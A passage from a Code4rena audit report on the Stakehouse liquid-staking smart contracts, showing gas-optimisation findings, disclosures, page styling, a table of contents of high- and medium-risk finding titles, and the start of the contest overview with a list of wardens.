issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"184\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ETHPoolLPFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">numberOfLPTokensIssued</span><span class=\"mtk1\">++;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/ETHPoolLPFactory.sol#L141\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/ETHPoolLPFactory.sol#L141</a></p>\n<h2 id=\"g22-using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g22-using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g22 using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑22] Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h2 id=\"g23-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g23-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g23 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑23] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There are 198 instances of this issue.</em></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-21\">High Risk Findings (21)</a></p>\n<ul>\n<li><a href=\"#h-01-any-user-being-the-first-to-claim-rewards-from-giantmevandfeespool-can-unexepectedly-collect-them-all\">[H-01] Any user being the first to claim rewards from <code>GiantMevAndFeesPool</code> can unexepectedly collect them all</a></li>\n<li><a href=\"#h-02-rewards-of-giantmevandfeespool-can-be-locked-for-all-users\">[H-02] Rewards of <code>GiantMevAndFeesPool</code> can be locked for all users</a></li>\n<li><a href=\"#h-03-theft-of-eth-of-free-floating-slot-holders\">[H-03] Theft of ETH of free floating SLOT holders</a></li>\n<li><a href=\"#h-04-unstaking-does-not-update-the-mapping-sethuserclaimforknot\">[H-04] Unstaking does not update the mapping <code>sETHUserClaimForKnot</code></a></li>\n<li><a href=\"#h-05-reentrancy-in-liquidstakingmanagersolwithdrawethforknow-leads-to-loss-of-fund-from-smart-wallet\">[H-05] Reentrancy in <code>LiquidStakingManager.sol#withdrawETHForKnow</code> leads to loss of fund from smart wallet</a></li>\n<li><a href=\"#h-06-bringunusedethbackintogiantpool-can-cause-stuck-ether-funds-in-giant-pool\">[H-06] <code>BringUnusedETHBackIntoGiantPool</code> can cause stuck ether funds in Giant Pool</a></li>\n<li><a href=\"#h-07-giantlp-with-a-transferhookprocessor-cant-be-burned-users-funds-will-be-stuck-in-the-giant-pool\">[H-07] GiantLP with a <code>transferHookProcessor</code> cant be burned, users’ funds will be stuck in the Giant Pool</a></li>\n<li><a href=\"#h-08-function-withdraweth-from-giantmevandfeespool-can-steal-most-of-eth-because-of-idleeth-is-reduced-before-burning-token\">[H-08] function <code>withdrawETH</code> from <code>GiantMevAndFeesPool</code> can steal most of eth because of idleETH is reduced before burning token</a></li>\n<li><a href=\"#h-09-incorrect-accounting-in-syndicaterewardsprocessor-results-in-any-lp-token-holder-being-able-to-steal-other-lp-tokens-holders-eth-from-the-fees-and-mev-vault\">[H-09] Incorrect accounting in <code>SyndicateRewardsProcessor</code> results in any LP token holder being able to steal other LP tokens holder’s ETH from the fees and MEV vault</a></li>\n<li><a href=\"#h-10-giantmevandfeespoolbringunusedethbackintogiantpool-function-loses-the-addition-of-the-idleeth-which-allows-attackers-to-steal-most-of-eth-from-the-giant-pool\">[H-10] <code>GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool</code> function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool</a></li>\n<li><a href=\"#h-11-protocol-insolvent---permanent-freeze-of-funds\">[H-11] Protocol insolvent - Permanent freeze of funds</a></li>\n<li><a href=\"#h-12-sender-transferring-giantmevandfeespool-tokens-can-afterward-experience-pool-dos-and-orphaning-of-future-rewards\">[H-12] Sender transferring <code>GiantMevAndFeesPool</code> tokens can afterward experience pool DOS and orphaning of future rewards</a></li>\n<li><a href=\"#h-13-possible-reentrancy-and-fund-theft-in-withdrawdeth-of-giantsavethvaultpool-because-there-is-no-whitelist-check-for-user-provided-vaults-and-there-is-no-reentrancy-defense\">[H-13] Possible reentrancy and fund theft in <code>withdrawDETH()</code> of <code>GiantSavETHVaultPool</code> because there is no whitelist check for user provided Vaults and there is no reentrancy defense</a></li>\n<li><a href=\"#h-14-fund-lose-in-function-bringunusedethbackintogiantpool-of-giantsavethvaultpool-eth-gets-back-to-giant-pool-but-the-value-of-idleeth-dont-increase\">[H-14] Fund lose in function <code>bringUnusedETHBackIntoGiantPool()</code> of <code>GiantSavETHVaultPool</code> ETH gets back to giant pool but the value of idleETH don’t increase</a></li>\n<li><a href=\"#h-15-user-loses-remaining-rewards-in-giantmevandfeespool-when-new-deposits-happen-because-_ondepositeth-set-claimed-to-max-without-transferring-user-remaining-rewards\">[H-15] User loses remaining rewards in <code>GiantMevAndFeesPool</code> when new deposits happen because <code>_onDepositETH()</code> set <code>claimed[][]</code> to max without transferring user remaining rewards</a></li>\n<li><a href=\"#h-16-reentrancy-vulnerability-in-giantmevandfeespoolwithdraweth\">[H-16] Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH</a></li>\n<li><a href=\"#h-17-giant-pools-can-be-drained-due-to-weak-vault-authenticity-check\">[H-17] Giant pools can be drained due to weak vault authenticity check</a></li>\n<li><a href=\"#h-18-old-stakers-can-steal-deposits-of-new-stakers-in-stakingfundsvault\">[H-18] Old stakers can steal deposits of new stakers in <code>StakingFundsVault</code></a></li>\n<li><a href=\"#h-19-withdraweth-in-giantpoolbase-dont-call-_distributeethrewardstouserfortoken-or-_onwithdraw-which-would-make-users-to-lose-their-remaining-rewards-\">[H-19] <code>withdrawETH()</code> in GiantPoolBase don’t call <code>_distributeETHRewardsToUserForToken()</code> or <code>_onWithdraw()</code> which would make users to lose their remaining rewards </a></li>\n<li><a href=\"#h-20-possibly-reentrancy-attacks-in-_distributeethrewardstouserfortoken-function\">[H-20] Possibly reentrancy attacks in <code>_distributeETHRewardsToUserForToken</code> function</a></li>\n<li><a href=\"#h-21-bringunusedethbackintogiantpool-in-giantmevandfeespool-can-be-used-to-steal-lptokens\">[H-21] <code>bringUnusedETHBackIntoGiantPool</code> in <code>GiantMevAndFeesPool</code> can be used to steal <code>LPTokens</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-31\">Medium Risk Findings (31)</a></p>\n<ul>\n<li><a href=\"#m-01-freezing-of-funds---hacker-can-prevent-users-withdraws-in-giant-pools\">[M-01] Freezing of funds - Hacker can prevent users withdraws in giant pools</a></li>\n<li><a href=\"#m-02-rotating-lptokens-to-banned-bls-public-key\">[M-02] Rotating <code>LPTokens</code> to banned BLS public key</a></li>\n<li><a href=\"#m-03-giant-pools-cannot-receive-eth-from-vaults\">[M-03] Giant pools cannot receive ETH from vaults</a></li>\n<li><a href=\"#m-04-giantpool-should-not-check-eth-amount-on-withdrawal\">[M-04] GiantPool should not check ETH amount on withdrawal</a></li>\n<li><a href=\"#m-05-adding-non-eoa-representative\">[M-05] Adding non EOA representative</a></li>\n<li><a href=\"#m-06-withdrawing-wrong-lptoken-from-giantpool-leads-to-loss-of-funds\">[M-06] Withdrawing wrong LPToken from GiantPool leads to loss of funds</a></li>\n<li><a href=\"#m-07-ownablesmartwallet-multiple-approvals-can-lead-to-unwanted-ownership-transfers\">[M-07] OwnableSmartWallet: Multiple approvals can lead to unwanted ownership transfers</a></li>\n<li><a href=\"#m-08-dao-admin-in-liquidstakingmanagersol-can-rug-the-registered-node-operator-by-stealing-their-fund-in-the-smart-wallet-via-arbitrary-execution\">[M-08] DAO admin in <code>LiquidStakingManager.sol</code> can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.</a></li>\n<li><a href=\"#m-09-dao-or-lsdn-owner-can-steal-funds-from-node-runner\">[M-09] DAO or lsdn owner can steal funds from node runner</a></li>\n<li><a href=\"#m-10--incorrect-implementation-of-the-ethpoollpfactorysolrotatelptokens-let-user-stakes-eth-more-than-maxstakingamountpervalidator-in-stakingfundsvault-and-dos-the-stake-function-in-liquidstakingmanager\">[M-10]  Incorrect implementation of the <code>ETHPoolLPFactory.sol#rotateLPTokens</code> let user stakes ETH more than <code>maxStakingAmountPerValidator</code> in <code>StakingFundsVault</code>, and DOS the stake function in <code>LiquidStakingManager</code></a></li>\n<li><a href=\"#m-11-banned-bls-public-keys-can-still-be-registered\">[M-11] Banned BLS public keys can still be registered</a></li>\n<li><a href=\"#m-12-attacker-can-grift-syndicate-staking-by-staking-a-small-amount\">[M-12] Attacker can grift syndicate staking by staking a small amount</a></li>\n<li><a href=\"#m-13-giantpool-batchrotatelptokens-function-minimum-balance-for-rotating-lp-tokens-should-by-dynamically-calculated\">[M-13] GiantPool <code>batchRotateLPTokens</code> function: Minimum balance for rotating LP Tokens should by dynamically calculated</a></li>\n<li><a href=\"#m-14-cross-chain-replay-attacks-are-possible-with-deploylptoken\">[M-14] Cross-chain replay attacks are possible with <code>deployLPToken</code></a></li>\n<li><a href=\"#m-15-giantmevandfeespoolpreviewaccumulatedeth-function-accumulated-variable-is-not-updated-correctly-in-for-loop-leading-to-result-that-is-too-low\">[M-15] <code>GiantMevAndFeesPool.previewAccumulatedETH</code> function: “accumulated” variable is not updated correctly in for loop leading to result that is too low</a></li>\n<li><a href=\"#m-16-deth--eth--lptokeneth-can-become-depegged-due-to-eth-20-reward-slashing\">[M-16] dETH / ETH / LPTokenETH can become depegged due to ETH 2.0 reward slashing</a></li>\n<li><a href=\"#m-17-addressiscontract-is-not-a-reliable-way-of-checking-if-the-input-is-an-eoa\">[M-17] <code>Address.isContract()</code> is not a reliable way of checking if the input is an EOA</a></li>\n<li><a href=\"#m-18-node-runners-can-lose-all-their-stake-rewards-due-to-how-the-dao-commissions-can-be-set-to-a-100\">[M-18] Node runners can lose all their stake rewards due to how the DAO commissions can be set to a 100%</a></li>\n<li><a href=\"#m-19-when-users-transfer-giantlp-some-rewards-may-be-lost\">[M-19] When users transfer GiantLP, some rewards may be lost</a></li>\n<li><a href=\"#m-20-smartwallet-address-is-not-guaranteed-correct-eth-may-be-lost\">[M-20] smartWallet address is not guaranteed correct. ETH may be lost</a></li>\n<li><a href=\"#m-21-eip1559-rewards-received-by-syndicate-during-the-period-when-it-has-no-registered-knots-can-be-lost\">[M-21] EIP1559 rewards received by syndicate during the period when it has no registered knots can be lost</a></li>\n<li><a href=\"#m-22-eth-sent-when-calling-executeassmartwallet-function-can-be-lost\">[M-22] ETH sent when calling <code>executeAsSmartWallet</code> function can be lost</a></li>\n<li><a href=\"#m-23-calling-updatenoderunnerwhiteliststatus-function-always-reverts\">[M-23] Calling <code>updateNodeRunnerWhitelistStatus</code> function always reverts</a></li>\n<li><a href=\"#m-24-node-runner-who-is-already-known-to-be-malicious-cannot-be-banned-before-corresponding-smart-wallet-is-created\">[M-24] Node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created</a></li>\n<li><a href=\"#m-25-incorrect-checking-in-_assertuserhasenoughgiantlptoclaimvaultlp\">[M-25] Incorrect checking in <code>_assertUserHasEnoughGiantLPToClaimVaultLP</code></a></li>\n<li><a href=\"#m-26-compromised-or-malicious-dao-can-restrict-actions-of-node-runners-who-are-not-malicious\">[M-26] Compromised or malicious DAO can restrict actions of node runners who are not malicious</a></li>\n<li><a href=\"#m-27-rotatenoderunnerofsmartwallet-is-vulnerable-to-a-frontrun-attack\">[M-27] <code>rotateNodeRunnerOfSmartWallet</code> is vulnerable to a frontrun attack</a></li>\n<li><a href=\"#m-28-funds-are-not-claimed-from-syndicate-for-valid-bls-keys-of-first-key-is-invalid-no-longer-part-of-syndicate\">[M-28] Funds are not claimed from syndicate for valid BLS keys of first key is invalid (no longer part of syndicate).</a></li>\n<li><a href=\"#m-29-user-receives-less-rewards-than-they-are-eligible-for-if-first-passed-bls-key-is-inactive\">[M-29] User receives less rewards than they are eligible for if first passed BLS key is inactive</a></li>\n<li><a href=\"#m-30-giant-pools-are-prone-to-user-griefing-preventing-their-holdings-from-being-staked\">[M-30] Giant pools are prone to user griefing, preventing their holdings from being staked</a></li>\n<li><a href=\"#m-31-vaults-can-be-griefed-to-not-be-able-to-be-used-for-deposits\">[M-31] Vaults can be griefed to not be able to be used for deposits</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l-01-draft-openzeppelin-dependencies\">L-01 Draft Openzeppelin Dependencies</a></li>\n<li><a href=\"#l-02-stack-too-deep-when-compiling\">L-02 Stack too deep when compiling</a></li>\n<li><a href=\"#l-03-remove-unused-code\">L-03 Remove unused code</a></li>\n<li><a href=\"#l-04-insufficient-coverage\">L-04 Insufficient coverage</a></li>\n<li><a href=\"#l-05-critical-address-changes-should-use-two-step-procedure\">L-05 Critical Address Changes Should Use Two-step Procedure</a></li>\n<li><a href=\"#l-06-owner-can-renounce-ownership\">L-06 Owner can renounce Ownership</a></li>\n<li><a href=\"#l-07-loss-of-precision-due-to-rounding\">L-07 Loss of precision due to rounding</a></li>\n<li><a href=\"#l-08-using-vulnerable-dependency-of-openzeppelin\">L-08 Using vulnerable dependency of OpenZeppelin</a></li>\n<li><a href=\"#l-09-use-safetransferownership-instead-of-transferownership-function\">L-09 Use <code>safeTransferOwnership</code> instead of <code>transferOwnership</code> function</a></li>\n<li><a href=\"#n-01-0-address-check\">N-01 <code>0 address</code> check</a></li>\n<li><a href=\"#n-02-add-parameter-to-event-emit\">N-02 Add parameter to Event-Emit</a></li>\n<li><a href=\"#n-03-omissions-in-events\">N-03 Omissions in Events</a></li>\n<li><a href=\"#n-04-include-return-parameters-in-natspec-comments\">N-04 Include <code>return parameters</code> in <em>NatSpec comments</em></a></li>\n<li><a href=\"#n-05-use-a-more-recent-version-of-solidity\">N-05 Use a more recent version of Solidity</a></li>\n<li><a href=\"#n-06-solidity-compiler-optimizations-can-be-problematic\">N-06 Solidity compiler optimizations can be problematic</a></li>\n<li><a href=\"#n-07-natspec-is-missing\">N-07 NatSpec is missing</a></li>\n<li><a href=\"#n-08-lines-are-too-long\">N-08 Lines are too long</a></li>\n<li><a href=\"#n-09-missing-event-for-critical-parameters-change\">N-09 Missing Event for critical parameters change</a></li>\n<li><a href=\"#n-10-add-to-indexed-parameter-for-countable-events\">N-10 Add to indexed parameter for countable Events</a></li>\n<li><a href=\"#n-11-natspec-comments-should-be-increased-in-contracts\">N-11 NatSpec comments should be increased in contracts</a></li>\n<li><a href=\"#n-12-open-todos\">N-12 Open TODOs</a></li>\n<li><a href=\"#n-13-empty-blocks-should-be-removed-or-emit-something\">N-13 <code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</a></li>\n<li><a href=\"#n-14-avoid-variable-names-that-can-shade\">N-14 Avoid variable names that can shade</a></li>\n<li><a href=\"#n-15-use-a-more-recent-version-of-solidity\">N-15 Use a more recent version of Solidity</a></li>\n<li><a href=\"#n-16-lock-pragmas-to-specific-compiler-version\">N-16 <em>Lock pragmas</em> to specific compiler version</a></li>\n<li><a href=\"#s-01-generate-perfect-code-headers-every-time\">S-01 Generate perfect code headers every time</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-2\">Summary</a></li>\n<li><a href=\"#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">G‑01 Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</a></li>\n<li><a href=\"#g02-state-variables-only-set-in-the-constructor-should-be-declared-immutable\">G‑02 State variables only set in the constructor should be declared <code>immutable</code></a></li>\n<li><a href=\"#g03-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G‑03 Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</a></li>\n<li><a href=\"#g04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑04 State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g05-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\">G‑05 The result of function calls should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g06-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G‑06 <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</a></li>\n<li><a href=\"#g07-internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑07 <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g08-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\">G‑08 <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</a></li>\n<li><a href=\"#g09-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G‑09 <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g10-optimize-names-to-save-gas\">G‑10 Optimize names to save gas</a></li>\n<li><a href=\"#g11-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\">G‑11 <code>internal</code> functions not called by the contract should be removed to save deployment gas</a></li>\n<li><a href=\"#g12-dont-compare-boolean-expressions-to-boolean-literals\">G‑12 Don’t compare boolean expressions to boolean literals</a></li>\n<li><a href=\"#g13-ternary-unnecessary\">G‑13 Ternary unnecessary</a></li>\n<li><a href=\"#g14-division-by-two-should-use-bit-shifting\">G‑14 Division by two should use bit shifting</a></li>\n<li><a href=\"#g15-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\">G‑15 Stack variable used as a cheaper cache for a state variable is only used once</a></li>\n<li><a href=\"#g16-empty-blocks-should-be-removed-or-emit-something\">G‑16 Empty blocks should be removed or emit something</a></li>\n<li><a href=\"#g17-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑17 Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g18-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑18 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#excluded-gas-findings\">Excluded Gas Findings</a></li>\n<li><a href=\"#g22-using-private-rather-than-public-for-constants-saves-gas\">G‑22 Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g23-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑23 Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the LSD Network - Stakehouse smart contract system written in Solidity. The audit contest took place between November 11—November 18 2022.\n\n## Wardens\n\n98 Wardens contributed reports to the LSD Network - Stakehouse contest:\n\n  1. 0x4non\n  2. [0xNazgul](https://twitter.com/0xNazgul)\n  3. 0xPanda\n  4. [0xRoxas](https://twitter.com/0xRoxas)\n  5. [0xSmartContract](https://twitter.com/0xSmartContract)\n  6. 0xbepresent\n  7. 0xdeadbeef0x\n  8. 0xmuxyz\n  9. 9svR6w\n  10. Awesome\n  11. [Aymen0909](https://github.com/Aymen1001)\n  12. B2\n  13. Bnke0x0\n  14. CloudX ([Migue](https://twitter.com/angel_tripi), pabliyo, and marce1993)\n  15. [Deivitto](https://twitter.com/Deivitto)\n  16. Diana\n  17. [Franfran](https://franfran.dev/)\n  18. HE1M\n  19. IllIllI\n  20. JTJabba\n  21. [Jeiwan](https://jeiwan.net)\n  22. Josiah\n  23. Lambda\n  24. RaymondFam\n  25. ReyAdmirado\n  26. Rolezn\n  27. SaeedAlipoor01988\n  28. Saintcode\\_\n  29. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)\n  30. Secureverse (imkapadia, Nsecv, and leosathya)\n  31. SmartSek (0xDjango and hake)\n  32. [Trust](https://twitter.com/trust__90)\n  33. [Udsen](https://github.com/udsene)\n  34. V\\_B (Barichek and vlad\\_bochok)\n  35. [a12jmx](https://twitter.com/a12jmx)\n  36. aphak5010\n  37. arcoun\n  38. [banky](https://twitter.com/0xbanky)\n  39. bearonbike\n  40. [bharg4v](https://twitter.com/Bharg4v)\n  41. [bin2chen](https://twitter.com/bin2chen)\n  42. bitbopper\n  43. brgltd\n  44. btk\n  45. bulej93\n  46. [c3phas](https://twitter.com/c3ph_)\n  47. c7e7eff\n  48. cccz\n  49. ch0bu\n  50. chaduke\n  51. chrisdior4\n  52. clems4ever\n  53. corerouter\n  54. cryptostellar5\n  55. datapunk\n  56. delfin454000\n  57. fs0c\n  58. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)\n  59. gz627\n  60. hihen\n  61. hl\\_\n  62. [ignacio](https://twitter.com/0xheynacho)\n  63. imare\n  64. immeas\n  65. [joestakey](https://twitter.com/JoeStakey)\n  66. koxuan\n  67. ladboy233\n  68. lukris02\n  69. [martin](https://github.com/martin-petrov03)\n  70. minhtrng\n  71. 